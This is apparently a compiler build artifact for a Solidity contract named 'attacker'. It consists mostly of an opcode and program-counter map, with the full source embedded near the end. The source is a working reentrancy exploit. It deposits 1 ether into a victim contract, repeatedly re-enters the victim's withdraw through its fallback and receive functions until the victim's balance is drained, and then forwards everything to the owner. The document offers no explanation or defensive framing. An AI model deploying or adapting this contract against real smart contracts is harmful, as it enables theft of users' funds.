        757,
        793
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "609": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "611": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "612": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "DUP1",
      "path": "0"
    },
    "613": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "DUP4",
      "path": "0"
    },
    "614": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "SUB",
      "path": "0"
    },
    "615": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "DUP2",
      "path": "0"
    },
    "616": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "DUP6",
      "path": "0"
    },
    "617": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "DUP9",
      "path": "0"
    },
    "618": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "DUP1",
      "path": "0"
    },
    "619": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "620": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "621": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "DUP1",
      "path": "0"
    },
    "622": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "623": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x277"
    },
    "626": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "627": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "629": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "DUP1",
      "path": "0"
    },
    "630": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "REVERT",
      "path": "0"
    },
    "631": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "632": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "POP",
      "path": "0"
    },
    "633": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "GAS",
      "path": "0"
    },
    "634": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "CALL",
      "path": "0"
    },
    "635": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "636": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "DUP1",
      "path": "0"
    },
    "637": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "638": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x28B"
    },
    "641": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "642": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "643": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "645": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "DUP1",
      "path": "0"
    },
    "646": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "647": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "648": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "650": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "REVERT",
      "path": "0"
    },
    "651": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "652": {
      "op": "POP"
    },
    "653": {
      "op": "POP"
    },
    "654": {
      "fn": "attacker.hack",
      "offset": [
        803,
        810
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 5,
      "value": "0x0"
    },
    "656": {
      "fn": "attacker.hack",
      "offset": [
        803,
        810
      ],
      "op": "DUP1",
      "path": "0"
    },
    "657": {
      "fn": "attacker.hack",
      "offset": [
        803,
        810
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "658": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "660": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "DUP1",
      "path": "0"
    },
    "661": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "662": {
      "op": "PUSH4",
      "value": "0x3CCFD60B"
    },
    "667": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "669": {
      "op": "SHL"
    },
    "670": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "DUP2",
      "path": "0"
    },
    "671": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "672": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "673": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "674": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "676": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "678": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "680": {
      "op": "SHL"
    },
    "681": {
      "op": "SUB"
    },
    "682": {
      "fn": "attacker.hack",
      "offset": [
        803,
        810
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "683": {
      "fn": "attacker.hack",
      "offset": [
        803,
        810
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "684": {
      "fn": "attacker.hack",
      "offset": [
        803,
        810
      ],
      "op": "AND",
      "path": "0"
    },
    "685": {
      "fn": "attacker.hack",
      "offset": [
        803,
        810
      ],
      "op": "SWAP6",
      "path": "0"
    },
    "686": {
      "op": "POP"
    },
    "687": {
      "fn": "attacker.hack",
      "offset": [
        803,
        819
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x3CCFD60B"
    },
    "692": {
      "fn": "attacker.hack",
      "offset": [
        803,
        819
      ],
      "op": "SWAP5",
      "path": "0"
    },
    "693": {
      "op": "POP"
    },
    "694": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "696": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "DUP1",
      "path": "0"
    },
    "697": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "DUP3",
      "path": "0"
    },
    "698": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "ADD",
      "path": "0"
    },
    "699": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "SWAP5",
      "path": "0"
    },
    "700": {
      "op": "POP"
    },
    "701": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "702": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "DUP3",
      "path": "0"
    },
    "703": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "704": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "SUB",
      "path": "0"
    },
    "705": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "ADD",
      "path": "0"
    },
    "706": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "DUP2",
      "path": "0"
    },
    "707": {
      "fn": "attacker.hack",
      "offset": [
        803,
        810
      ],
      "op": "DUP4",
      "path": "0"
    },
    "708": {
      "fn": "attacker.hack",
      "offset": [
        803,
        810
      ],
      "op": "DUP8",
      "path": "0"
    },
    "709": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "DUP1",
      "path": "0"
    },
    "710": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "711": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "712": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "DUP1",
      "path": "0"
    },
    "713": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "714": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D2"
    },
    "717": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "718": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "720": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "DUP1",
      "path": "0"
    },
    "721": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "REVERT",
      "path": "0"
    },
    "722": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "723": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "POP",
      "path": "0"
    },
    "724": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "GAS",
      "path": "0"
    },
    "725": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "CALL",
      "path": "0"
    },
    "726": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "727": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "DUP1",
      "path": "0"
    },
    "728": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "729": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2E6"
    },
    "732": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "733": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "734": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "736": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "DUP1",
      "path": "0"
    },
    "737": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "738": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "739": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "741": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "REVERT",
      "path": "0"
    },
    "742": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "743": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "POP",
      "path": "0"
    },
    "744": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "POP",
      "path": "0"
    },
    "745": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "POP",
      "path": "0"
    },
    "746": {
      "fn": "attacker.hack",
      "offset": [
        803,
        821
      ],
      "op": "POP",
      "path": "0"
    },
    "747": {
      "fn": "attacker.hack",
      "jump": "o",
      "offset": [
        630,
        828
      ],
      "op": "JUMP",
      "path": "0"
    },
    "748": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "749": {
      "offset": [
        438,
        448
      ],
      "op": "CALLER",
      "path": "0"
    },
    "750": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "752": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "754": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "756": {
      "op": "SHL"
    },
    "757": {
      "op": "SUB"
    },
    "758": {
      "offset": [
        452,
        457
      ],
      "op": "PUSH32",
      "path": "0",
      "value": "0x0"
    },
    "791": {
      "offset": [
        438,
        457
      ],
      "op": "AND",
      "path": "0"
    },
    "792": {
      "branch": 9,
      "fn": "attacker.withdrawing",
      "offset": [
        438,
        457
      ],
      "op": "EQ",
      "path": "0"
    },
    "793": {
      "offset": [
        430,
        471
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x350"
    },
    "796": {
      "branch": 9,
      "offset": [
        430,
        471
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "797": {
      "fn": "attacker.withdrawing",
      "offset": [
        430,
        471
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "799": {
      "fn": "attacker.withdrawing",
      "offset": [
        430,
        471
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "800": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "804": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "806": {
      "op": "SHL"
    },
    "807": {
      "offset": [
        430,
        471
      ],
      "op": "DUP2",
      "path": "0"
    },
    "808": {
      "fn": "attacker.withdrawing",
      "offset": [
        430,
        471
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "809": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "811": {
      "offset": [
        430,
        471
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "813": {
      "fn": "attacker.withdrawing",
      "offset": [
        430,
        471
      ],
      "op": "DUP3",
      "path": "0"
    },
    "814": {
      "fn": "attacker.withdrawing",
      "offset": [
        430,
        471
      ],
      "op": "ADD",
      "path": "0"
    },
    "815": {
      "op": "MSTORE"
    },
    "816": {
      "op": "PUSH1",
      "value": "0x9"
    },
    "818": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "820": {
      "op": "DUP3"
    },
    "821": {
      "op": "ADD"
    },
    "822": {
      "op": "MSTORE"
    },
    "823": {
      "op": "PUSH9",
      "value": "0x2737BA1037BBB732B9"
    },
    "833": {
      "op": "PUSH1",
      "value": "0xB9"
    },
    "835": {
      "op": "SHL"
    },
    "836": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "838": {
      "op": "DUP3"
    },
    "839": {
      "op": "ADD"
    },
    "840": {
      "op": "MSTORE"
    },
    "841": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "843": {
      "op": "ADD"
    },
    "844": {
      "offset": [
        430,
        471
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1C0"
    },
    "847": {
      "op": "JUMP"
    },
    "848": {
      "offset": [
        430,
        471
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "849": {
      "fn": "attacker.withdrawing",
      "offset": [
        1034,
        1043
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "851": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1054
      ],
      "op": "PUSH32",
      "path": "0",
      "value": "0x0"
    },
    "884": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "886": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "888": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "890": {
      "op": "SHL"
    },
    "891": {
      "op": "SUB"
    },
    "892": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1059
      ],
      "op": "AND",
      "path": "0"
    },
    "893": {
      "fn": "attacker.withdrawing",
      "offset": [
        1067,
        1088
      ],
      "op": "SELFBALANCE",
      "path": "0"
    },
    "894": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "896": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "897": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "899": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "901": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "902": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "DUP1",
      "path": "0"
    },
    "903": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "DUP4",
      "path": "0"
    },
    "904": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "SUB",
      "path": "0"
    },
    "905": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "DUP2",
      "path": "0"
    },
    "906": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "DUP6",
      "path": "0"
    },
    "907": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "DUP8",
      "path": "0"
    },
    "908": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "GAS",
      "path": "0"
    },
    "909": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "CALL",
      "path": "0"
    },
    "910": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "911": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "POP",
      "path": "0"
    },
    "912": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "POP",
      "path": "0"
    },
    "913": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "POP",
      "path": "0"
    },
    "914": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "915": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "DUP1",
      "path": "0"
    },
    "916": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "918": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "DUP2",
      "path": "0"
    },
    "919": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "EQ",
      "path": "0"
    },
    "920": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3BD"
    },
    "923": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "924": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "926": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "927": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "928": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "POP",
      "path": "0"
    },
    "929": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "931": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "NOT",
      "path": "0"
    },
    "932": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x3F"
    },
    "934": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "935": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "ADD",
      "path": "0"
    },
    "936": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "AND",
      "path": "0"
    },
    "937": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "DUP3",
      "path": "0"
    },
    "938": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "ADD",
      "path": "0"
    },
    "939": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "941": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "942": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "943": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "DUP3",
      "path": "0"
    },
    "944": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "945": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "946": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "948": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "950": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "DUP5",
      "path": "0"
    },
    "951": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "ADD",
      "path": "0"
    },
    "952": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "953": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x3C2"
    },
    "956": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "JUMP",
      "path": "0"
    },
    "957": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "958": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x60"
    },
    "960": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "961": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "POP",
      "path": "0"
    },
    "962": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "963": {
      "fn": "attacker.withdrawing",
      "offset": [
        1049,
        1093
      ],
      "op": "POP",
      "path": "0"
    },
    "964": {
      "fn": "attacker.withdrawing",
      "offset": [
        1033,
        1093
      ],
      "op": "POP",
      "path": "0"
    },
    "965": {
      "fn": "attacker.withdrawing",
      "offset": [
        1033,
        1093
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "966": {
      "fn": "attacker.withdrawing",
      "offset": [
        1033,
        1093
      ],
      "op": "POP",
      "path": "0"
    },
    "967": {
      "branch": 10,
      "fn": "attacker.withdrawing",
      "offset": [
        1111,
        1115
      ],
      "op": "DUP1",
      "path": "0",
      "statement": 6
    },
    "968": {
      "fn": "attacker.withdrawing",
      "offset": [
        1103,
        1140
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x15D"
    },
    "971": {
      "branch": 10,
      "fn": "attacker.withdrawing",
      "offset": [
        1103,
        1140
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "972": {
      "fn": "attacker.withdrawing",
      "offset": [
        1103,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "974": {
      "fn": "attacker.withdrawing",
      "offset": [
        1103,
        1140
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "975": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "979": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "981": {
      "op": "SHL"
    },
    "982": {
      "fn": "attacker.withdrawing",
      "offset": [
        1103,
        1140
      ],
      "op": "DUP2",
      "path": "0"
    },
    "983": {
      "fn": "attacker.withdrawing",
      "offset": [
        1103,
        1140
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "984": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "986": {
      "fn": "attacker.withdrawing",
      "offset": [
        1103,
        1140
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "988": {
      "fn": "attacker.withdrawing",
      "offset": [
        1103,
        1140
      ],
      "op": "DUP3",
      "path": "0"
    },
    "989": {
      "fn": "attacker.withdrawing",
      "offset": [
        1103,
        1140
      ],
      "op": "ADD",
      "path": "0"
    },
    "990": {
      "op": "MSTORE"
    },
    "991": {
      "op": "PUSH1",
      "value": "0x14"
    },
    "993": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "995": {
      "op": "DUP3"
    },
    "996": {
      "op": "ADD"
    },
    "997": {
      "op": "MSTORE"
    },
    "998": {
      "op": "PUSH20",
      "value": "0x2330B4B632B2103A379039B2B7321022BA3432B9"
    },
    "1019": {
      "op": "PUSH1",
      "value": "0x61"
    },
    "1021": {
      "op": "SHL"
    },
    "1022": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "1024": {
      "op": "DUP3"
    },
    "1025": {
      "op": "ADD"
    },
    "1026": {
      "op": "MSTORE"
    },
    "1027": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "1029": {
      "op": "ADD"
    },
    "1030": {
      "fn": "attacker.withdrawing",
      "offset": [
        1103,
        1140
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1C0"
    },
    "1033": {
      "op": "JUMP"
    }
  },
  "sha1": "7bba6904fe8b538bd3d36402be61897979aeccd6",
  "source": "//SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface Ivictim {\n    function deposit() external payable;\n\n    function withdraw() external;\n}\n\ncontract attacker {\n    Ivictim public bobolon;\n\n    address immutable loko;\n    address immutable owner;\n\n    constructor(address _bobolon) {\n        bobolon = Ivictim(_bobolon);\n        loko = _bobolon;\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Not owner\");\n        _;\n    }\n\n    fallback() external payable {\n        chekBalance(loko);\n    }\n\n    receive() external payable {\n        chekBalance(loko);\n    }\n\n    function hack() external payable onlyOwner {\n        require(msg.value >= 1 * 10**18, \"Wrong value, it must be >= 1\");\n        bobolon.deposit{value: 1 * 10**18}();\n        bobolon.withdraw();\n    }\n\n    function chekBalance(address _victim) internal {\n        if (_victim.balance >= 1 * 10**18) {\n            bobolon.withdraw();\n        }\n    }\n\n    function withdrawing() external onlyOwner {\n        (bool sent, ) = owner.call{value: address(this).balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n",
  "sourceMap": "155:994:0:-:0;;;266:127;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;306:7;:27;;-1:-1:-1;;;;;306:27:0;;;-1:-1:-1;;;;;;306:27:0;;;;;;;343:15;;376:10;368:18;;155:994;;14:290:1;84:6;137:2;125:9;116:7;112:23;108:32;105:52;;;153:1;150;143:12;105:52;179:16;;-1:-1:-1;;;;;224:31:1;;214:42;;204:70;;270:1;267;260:12;204:70;293:5;14:290;-1:-1:-1;;;14:290:1:o;:::-;155:994:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;",
  "sourcePath": "contracts/attacker.sol",
  "type": "contract"
}